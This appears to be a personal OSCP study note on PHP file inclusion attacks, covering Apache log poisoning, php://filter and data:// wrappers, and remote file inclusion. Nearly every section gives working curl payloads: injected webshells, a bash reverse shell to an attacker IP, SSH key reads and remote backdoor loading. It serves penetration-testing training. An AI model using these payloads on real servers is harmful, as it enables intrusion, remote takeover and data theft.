---
aliases:
  - File Inclusion
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - web_app_attack
  - file_inclusion
author: Mehdi N Tehrani
creat_date: 2023-12-24
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Local File Inclusion
#local_file_inclusion #lfi
## Log poisoning
#log_poisoning #apache2 #linux
We can use directory traversal or any other method to find out what info is getting logged.
e.g. in apache logs are stored in `/var/log/apache2/access.log` file. 
With the following we can find out that User-Agent header gets stored in this file.
 `curl http://<domain>/index.php?page=../../../../../../../../../var/log/apache2/access.log`
So we can make an HTTP call with the following user agent:
`Mozilla/5.0 <?php echo system($_GET['cmd']) ?>`
This will get stored in `access.log` file and then by making another:
`curl http://<domain>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps`
this will run `ps` on the machine and prints the output on the page
Now that we have RCE #rce on remote server, we can get a reverse shell with the following URL:
`http://<domain>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.216%2F7777%200%3E%261%22`
decoded command: `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`

#windows #xampp #apache2
in Windows if xampp is serving PHP, logs are stored in the following path:
`C:\xampp\apache\logs\`
- Read the logs:
`curl -s --path-as-is --proxy 127.0.0.1:8080 'http://192.168.222.193/meteor/index.php?page=../../../../../../../../../xampp/apache/logs/access.log'`
- Poison the log
`curl -s --path-as-is --proxy 127.0.0.1:8080 'http://192.168.222.193/meteor/index.php' --user-agent 'curl <?php system($_GET['cmd'])?>'`
- Read the file of interest:
`curl -s --path-as-is --proxy 127.0.0.1:8080 'http://192.168.222.193/meteor/index.php?page=../../../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt'`



Other than PHP, the following server-side languages can also be exploited:
#perl #asp #asp_dotnet #jsp
- Perl
- [Active Server Pages Extended (ASP.NET)](https://en.wikipedia.org/wiki/ASP.NET)
- [Active Server Pages (ASP)](https://en.wikipedia.org/wiki/Active_Server_Pages)
- [Java Server Pages (Jakarta Server Pages)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)
- Node.js

# PHP Wrappers
#php_wrapper 
PHP wrappers can be used to represent and access local or remote filesystems and other functionalities.

## filter wrapper
#php #filter #wrapper
`php://filter`
Using `php://filter`, we can also display the contents of executable files such as .php, rather than executing them.
In the following example, we make the admin.php file to be retrieved in its raw form (before being processed) encoded into base-64. 
`curl http://<host>/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
Sensitive data might be stored in the PHP file which can be retrieved this way.

Another example, to obtain base64 encoded string of `/var/www/html/backup.php` file on the server
`curl -s --path-as-is --proxy 127.0.0.1:8080 'http://192.168.222.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php'`
## data wrapper
#php #data #wrapper
`php://data`
This wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application's code. This offers an alternative method when we cannot poison a local file with PHP code. It will **not** work in a default PHP installation. 
> To exploit it, the [allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php) setting needs to be enabled. `allow_url_include` is deprecated as of PHP 7.4.0 and default value is set to `0` (disabled).

e.g.
`curl "http://<host>/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
or base-64 encoded: 
```
$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
```
to list files in current working directory:
`curl "http://<host>/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
or the following to get os version:
`curl -s --path-as-is --proxy 127.0.0.1:8080 'http://192.168.222.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbY21kXSk/Pgo=&cmd=uname%20-a' | rg -i linux`
# Remote File Inclusion
#remote_file_inclusion #rfi
The `allow_url_include` option needs to be enabled to leverage RFI which is disabled by default in modern PHP and deprecated as of PHP 7.4.0.
RFI vulnerabilities allow us to include files from a *remote* system over **HTTP** or **SMB**.
PHP webshells in the `/usr/share/webshells/php/` in Kali can be used for RFI

`curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`

another example, use `simplebackdoor.php` script:
`curl -s 'http://192.168.222.16/meteor/index.php?page=http://192.168.45.216/sb.php&cmd=cat%20/home/elaine/.ssh/authorized_keys'`

get a reverse shell:
`curl -s 'http://192.168.222.16/meteor/index.php?page=http://192.168.45.216/rev.php'`